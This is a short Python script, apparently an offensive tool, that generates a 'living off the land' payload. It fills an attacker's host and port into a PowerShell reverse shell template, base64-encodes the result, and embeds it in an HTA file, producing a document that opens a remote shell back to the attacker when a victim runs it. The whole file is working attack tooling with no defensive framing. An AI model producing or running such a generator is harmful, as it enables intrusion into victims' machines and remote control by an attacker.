import sys
import base64

print("--- LOTL payload generator ---")
print("By: Soroush(Amirali) Rafie")
print("github: Null-byte-00")

if len(sys.argv) < 4:
    print("usage:")
    print("python generator.py <HOST> <PORT> <Out file>")
    exit(1)

host = sys.argv[1]
port = sys.argv[2]
out_file = sys.argv[3]

reverse_shell_ps4 = open("reverse_shell.ps1").read()
reverse_shell_ps4 = reverse_shell_ps4.replace("<HOST>", host)
reverse_shell_ps4 = reverse_shell_ps4.replace("<PORT>", port)

b64_encoded_payload = str(base64.b64encode(reverse_shell_ps4.encode()), 'utf-8')
js = open("initialize.hta").read()
js = js.replace("<B64-Payload>", b64_encoded_payload)

open(out_file, 'w').write(js)
print(f'payload saved to: {out_file}')